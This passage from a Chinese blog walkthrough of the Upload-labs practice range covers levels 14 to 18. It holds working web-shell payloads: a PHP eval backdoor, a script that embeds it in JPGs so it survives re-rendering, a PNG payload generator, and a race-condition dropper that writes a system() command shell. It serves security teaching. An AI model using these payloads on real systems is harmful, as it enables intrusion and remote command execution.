<h2 id="知识补充点："><a href="#知识补充点：" class="headerlink" title="知识补充点："></a>知识补充点：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span> getimagesize ( string $filename [, <span class="keyword">array</span> &amp;$imageinfo ] )</span><br><span class="line">getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 IMG 标记中的 height/width 文本字符串。</span><br><span class="line"></span><br><span class="line">如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 <span class="keyword">FALSE</span> 并产生一条 E_WARNING 级的错误。</span><br></pre></td></tr></table></figure>

<p>同样用上一关的图片木马进行上传也可成功<br>利用方式和上一关一样，需要文件包含漏洞</p>
<h1 id="Pass-15-图片马php-exif"><a href="#Pass-15-图片马php-exif" class="headerlink" title="Pass-15 图片马php_exif"></a>Pass-15 图片马php_exif</h1><p>本关还是要上传一个图片马，这里用到php_exif模块来判断文件类型，还是直接就可以利用图片马就可进行绕过就不多说。</p>
<h1 id="Pass-16-图片马二次渲染"><a href="#Pass-16-图片马二次渲染" class="headerlink" title="Pass-16 图片马二次渲染"></a>Pass-16 图片马二次渲染</h1><p>因为上传显示的的图片是二次渲染后生成的新图片，所以之前插入在图片中的代码会被过滤掉，因此上述的图片马无法实现</p>
<p>不同图片不同的绕过方法：</p>
<h2 id="gif："><a href="#gif：" class="headerlink" title="gif："></a>gif：</h2><p>先把gif上传后，取出该文件与未修改的文件进行对比</p>
<img src="/2019/07/31/Upload-labs/0x16-1.png" title="0x16-1">
<p>蓝色部分内容为未改变的部分，因此可在蓝色部分中插入木马上传绕过</p>
<img src="/2019/07/31/Upload-labs/0x16-2.png" title="0x16-2">
<p>再上传</p>
<img src="/2019/07/31/Upload-labs/0x16-3.png" title="0x16-3">
<p>被修改的内容未被过滤，成功绕过，再结合文件包含漏洞</p>
<h2 id="jpg："><a href="#jpg：" class="headerlink" title="jpg："></a>jpg：</h2><p>过于复杂，利用脚本处理得到上传图片：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs "Something's wrong".</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    $miniPayload = <span class="string">"&lt;?php eval($_POST['DD']); ?&gt;"</span>;<span class="comment">//插入的恶意代码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">'gd'</span>) || !function_exists(<span class="string">'imagecreatefromjpeg'</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'php-gd is not installed'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($argv[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'php jpg_payload.php &lt;jpg_name.jpg&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">"custom_error_handler"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($pad = <span class="number">0</span>; $pad &lt; <span class="number">1024</span>; $pad++) &#123;</span><br><span class="line">        $nullbytePayloadSize = $pad;</span><br><span class="line">        $dis = <span class="keyword">new</span> DataInputStream($argv[<span class="number">1</span>]);</span><br><span class="line">        $outStream = file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">        $extraBytes = <span class="number">0</span>;</span><br><span class="line">        $correctImage = <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($dis-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Incorrect SOI marker'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            $marker = $dis-&gt;readByte();</span><br><span class="line">            $size = $dis-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            <span class="keyword">if</span>($marker === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                $startPos = $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp =</span><br><span class="line">                    substr($outStream, <span class="number">0</span>, $startPos) .</span><br><span class="line">                    $miniPayload .</span><br><span class="line">                    str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize) .</span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(<span class="string">'_'</span>.$argv[<span class="number">1</span>], $outStreamTmp, <span class="keyword">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>($extraBytes !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!$dis-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>($dis-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>($dis-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $stopPos = $dis-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    $imageStreamSize = $stopPos - $startPos;</span><br><span class="line">                    $outStream =</span><br><span class="line">                        substr($outStream, <span class="number">0</span>, $startPos) .</span><br><span class="line">                        $miniPayload .</span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) .</span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>($correctImage) &#123;</span><br><span class="line">                    $outStream = $outStreamTmp;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>], $outStream)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'Success!'</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Something\'s wrong'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span><span class="params">($filename, $data, $unlink = FALSE)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage = <span class="keyword">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        <span class="keyword">if</span>($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        <span class="keyword">return</span> $correctImage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span><span class="params">($errno, $errstr, $errfile, $errline)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $extraBytes, $correctImage;</span><br><span class="line">        $correctImage = <span class="keyword">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(\d+) extraneous bytes before marker/'</span>, $errstr, $m)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($m[<span class="number">1</span>])) &#123;</span><br><span class="line">                $extraBytes = (int)$m[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $binData;</span><br><span class="line">        <span class="keyword">private</span> $order;</span><br><span class="line">        <span class="keyword">private</span> $size;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $order = false, $fromString = false)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">''</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = $order;</span><br><span class="line">            <span class="keyword">if</span>(!$fromString) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'File not exists ['</span>.$filename.<span class="string">']'</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents($filename);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = $filename;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span><span class="params">($skip)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, $skip);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'End Of File'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $byte = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord($byte);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'End Of File'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $short = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $short;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>但有一些jpg图片不能被处理,所以要多尝试一些jpg图片<br>使用脚本处理1.jpg</p>
<img src="/2019/07/31/Upload-labs/0x16-4.png" title="0x16-4">
<p>得到</p>
<img src="/2019/07/31/Upload-labs/0x16-5.png" title="0x16-5">
<p>用16进制编辑器查看</p>
<img src="/2019/07/31/Upload-labs/0x16-6.png" title="0x16-6">
<p>生成的图片中已插入php代码<br>上传该图片码后，插入的php代码未被过滤</p>
<h2 id="png"><a href="#png" class="headerlink" title="png:"></a>png:</h2><p>同样使用脚本处理图片:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($y = <span class="number">0</span>; $y &lt; sizeof($p); $y += <span class="number">3</span>) &#123;</span><br><span class="line">   $r = $p[$y];</span><br><span class="line">   $g = $p[$y+<span class="number">1</span>];</span><br><span class="line">   $b = $p[$y+<span class="number">2</span>];</span><br><span class="line">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y / <span class="number">3</span>), <span class="number">0</span>, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,<span class="string">'./1.png'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2019/07/31/Upload-labs/0x16-7.png" title="0x16-7">
<p>得到</p>
<img src="/2019/07/31/Upload-labs/0x16-8.png" title="0x16-8">
<p>16进制编辑器查看</p>
<img src="/2019/07/31/Upload-labs/0x16-9.png" title="0x16-9">
<p>php代码已插入<br>代码的使用：<br>url：</p>
<img src="/2019/07/31/Upload-labs/0x16-10.png" title="0x16-10">
<p>post:</p>
<img src="/2019/07/31/Upload-labs/0x16-11.png" title="0x16-11">
<p>相当于执行命令system(ipconfig)</p>
<hr>
<p>本关还是要上传一个图片马。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">imagecreatefrom 系列函数用于从文件或 URL 载入一幅图像，成功返回图像资源，失败则返回一个空字符串。</span><br><span class="line">该系列函数有：</span><br><span class="line">imagecreatefromgif()：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像</span><br><span class="line">imagecreatefromjpeg()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像</span><br><span class="line">imagecreatefrompng()：创建一块画布，并从 PNG 文件或 URL 地址载入一副图像</span><br><span class="line">imagecreatefromwbmp()：创建一块画布，并从 WBMP 文件或 URL 地址载入一副图像</span><br><span class="line">imagecreatefromstring()：创建一块画布，并从字符串中的图像流新建一副图像</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Pass-17-条件竞争"><a href="#Pass-17-条件竞争" class="headerlink" title="Pass-17 条件竞争"></a>Pass-17 条件竞争</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">'/'</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在if判读不通过unlink文件之前已经用move_uploaded_file函数将文件上传到upload目录下，所以通过bp不断的上传weshell，然后在浏览器中不断的访问总能访问到未被unlink的webshell文件</p>
<p>这里可以使用burp去发包， 即用Burp不断上传，再用burp不断访问 ，在burp中不断发送上传webshell的数据包，可以把文件内容改成下面这样   （就是为了写文件进去就对了）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$c=fopen(<span class="string">'./cmd.php'</span>,<span class="string">'w'</span>);</span><br><span class="line">fwrite($c,<span class="string">'&lt;?php system($_GET["f"]);?&gt;'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2019/07/31/Upload-labs/0x17-1.png" title="0x17-1">
<img src="/2019/07/31/Upload-labs/0x17-2.png" title="0x17-2">
<p>跑了之后， 就会在该文件夹下面产生新的文件了</p>
<img src="/2019/07/31/Upload-labs/0x17-3.png" title="0x17-3">
<p>访问</p>
<img src="/2019/07/31/Upload-labs/0x17-4.png" title="0x17-4">

<h1 id="Pass18-条件竞争图片马"><a href="#Pass18-条件竞争图片马" class="headerlink" title="Pass18 条件竞争图片马"></a>Pass18 条件竞争图片马</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">"./myupload.php"</span>);</span><br><span class="line">    $imgFileName =time();</span><br><span class="line">    $u = <span class="keyword">new</span> MyUpload($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>], $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $_FILES[<span class="string">'upload_file'</span>][<span 